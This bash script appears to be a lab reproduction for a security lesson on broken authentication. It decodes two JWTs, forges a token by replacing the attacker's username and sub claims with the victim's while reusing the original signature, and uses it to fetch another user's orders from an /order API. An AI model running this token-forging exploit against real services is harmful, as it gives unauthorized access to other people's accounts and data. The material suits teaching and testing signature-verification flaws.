
# =========================================================
# Lesson 2 - Broken Authentication
# Reproduction script
# =========================================================

echo "[*] Lesson 2 - Broken Authentication reproduction"

# Step 0: helper function to ensure required variables exist
require_var() {
  local name="$1"
  if [ -z "${!name:-}" ]; then
    echo "[!] Missing required environment variable: $name"
    exit 1
  fi
}

# Step 1: confirm the main required variables are set
# API      = /order endpoint
# TOKEN_B  = attacker token
# TOKEN_C  = victim token
require_var API
require_var TOKEN_B
require_var TOKEN_C

echo
echo "=============================="
echo "Step 1 - Decode TOKEN_B and TOKEN_C"
echo "=============================="

# Decode both JWT payloads so we can read username and sub
python3 - <<'PY'
import os, json, base64

def decode(token):
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode()))

for name in ["TOKEN_B", "TOKEN_C"]:
    data = decode(os.environ[name])
    print(f"\n{name}")
    print("username:", data.get("username"))
    print("sub     :", data.get("sub"))
PY

echo
echo "[!] From the output above, export the victim identity:"
echo '    export VICTIM_USERNAME="<user-c-username>"'
echo '    export VICTIM_SUB="<user-c-sub>"'
echo

# Step 2: require victim values before continuing
require_var VICTIM_USERNAME
require_var VICTIM_SUB

echo "=============================="
echo "Step 2 - Show normal behavior with TOKEN_B"
echo "=============================="

# This should return only User B's own orders
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw '{"action":"orders"}' | jq

echo
echo "=============================="
echo "Step 3 - Build a forged token as User C"
echo "=============================="

# Build a forged token:
# - start from TOKEN_B
# - replace username/sub with victim values
# - keep original header/signature structure
export FAKE_AS_C="$(
python3 - <<'PY'
import os, json, base64

t = os.environ["TOKEN_B"]
victim_username = os.environ["VICTIM_USERNAME"]
victim_sub = os.environ["VICTIM_SUB"]

h, p, s = t.split(".")
p += "=" * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p.encode()))

data["username"] = victim_username
data["sub"] = victim_sub

newp = base64.urlsafe_b64encode(
    json.dumps(data, separators=(",", ":")).encode()
).rstrip(b"=").decode()

print(f"{h}.{newp}.{s}")
PY
)"

echo "[*] Forged token created."
echo "[*] Forged token length: ${#FAKE_AS_C}"

echo
echo "=============================="
echo "Step 4 - Use forged token to request victim order list"
echo "=============================="

# This is the main Lesson 2 exploit proof:
# if vulnerable, the response should return User C's orders
curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $FAKE_AS_C" \
  --data-raw '{"action":"orders"}' | jq

